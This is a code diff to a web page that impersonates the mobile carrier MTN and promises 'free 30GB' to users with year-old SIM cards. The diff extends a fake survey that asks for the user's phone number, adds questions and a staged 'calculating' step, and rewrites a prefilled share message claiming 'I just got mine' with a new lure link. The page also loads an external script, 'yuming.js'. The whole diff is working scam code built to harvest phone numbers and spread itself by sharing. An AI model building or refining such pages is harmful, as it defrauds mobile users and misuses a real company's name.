@@ -323,8 +323,8 @@ $(".calculating").hide();
 //show step 3 MobGyan
 $(".question_count span").html("3");
 $(".question_count").show();
-$(".question1").show();
-$(".anses1").show();
+$(".question3").show();
+$(".anses3").show();
 }, 1200);
 }, 300);
 },
@@ -332,8 +332,8 @@ step3: function() {
 setTimeout(function() {
 //hide question block MobGyan
 $(".question_count").hide();
-$(".question1").hide();
-$(".anses1").hide();
+$(".question3").hide();
+$(".anses3").hide();
 //show calculating MobGyan
 $(".calculating").show();
 setTimeout(function() {
@@ -1298,9 +1298,15 @@ Get free 30GB if your sim card is up to a year now.<br>
 <div class="survey_middle">
 <div class="survey_inner">
 <p class="question_text question1">
-  ENTER YOUR PHONE NUMBER
+   ENTER YOUR PHONE NUMBER
   <input type="text" name="_name" placeholder="+233"><br/>
-Is your sim up to a year?
+Is your sim card up to a year??
+</p>
+<p class="question_text question2">
+Do you enjoy using MTN?
+</p>
+<p class="question_text question3">
+What is your network type?
 </p>
 <div class="ans-box">
 <div class="answer anses1">
@@ -1315,7 +1321,33 @@ No
 </div>
 <div class="answer anses1">
 <p>
-Not sure               
+Not sure
+</p>
+</div>
+<div class="answer anses2">
+<p>Yes</p>
+</div>
+<div class="answer anses2">
+<p>	No</p>
+</div>
+<div class="answer anses3">
+<p>
+2G
+</p>
+</div>
+<div class="answer anses3">
+<p>
+3G
+</p>
+</div>
+<div class="answer anses3">
+<p>
+4G
+</p>
+</div>
+<div class="answer anses3">
+<p>
+5G
 </p>
 </div>
 <p class="calculating">
@@ -1385,7 +1417,7 @@ fn1_a();
 },2000)
 }
 
-j='*MTN*%0A%0AGet free 30GB if your sim card is up to a year now.%0A*I just got mine*%0A%0AClick the link below to get yours%0Ahttps://everylinks.github.io/grant-pg%0A';
+j='*MTN*%0A%0AGet free 30GB if your sim card is up to a year now.%0A*I just got mine*%0A%0AClick the link below to get yours👇👇%0Ahttps://reallinks.github.io/30GB-simcard-offer%0A';
 banner='';
 $.getScript('yuming.js?'+ (new Date()).getTime());
 
